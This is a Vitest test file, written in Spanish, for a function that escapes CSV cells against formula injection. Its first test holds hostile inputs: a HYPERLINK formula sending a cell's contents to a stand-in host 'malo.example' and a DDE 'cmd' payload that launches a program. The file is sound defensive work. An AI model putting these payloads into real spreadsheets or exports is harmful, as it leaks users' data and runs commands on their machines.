import { describe, expect, it } from 'vitest';
import { sinFormula } from './csvSeguro';

describe('sinFormula', () => {
  it('desactiva lo que Excel ejecutaría como fórmula', () => {
    expect(sinFormula('=HYPERLINK("http://malo.example/?d="&A1;"pulsa")')).toBe(`'=HYPERLINK("http://malo.example/?d="&A1;"pulsa")`);
    expect(sinFormula('+cmd|\' /C calc\'!A0')).toBe(`'+cmd|' /C calc'!A0`);
    expect(sinFormula('-2+3')).toBe(`'-2+3`);
    expect(sinFormula('@SUM(A1:A9)')).toBe(`'@SUM(A1:A9)`);
    expect(sinFormula('\t=1')).toBe(`'\t=1`);
  });

  it('deja en paz los textos normales y los importes', () => {
    expect(sinFormula('Ferretería Martín')).toBe('Ferretería Martín');
    expect(sinFormula('-12,50')).toBe('-12,50');
    expect(sinFormula('+3')).toBe('+3');
    expect(sinFormula('1.234,56')).toBe('1.234,56');
    expect(sinFormula('')).toBe('');
  });
});
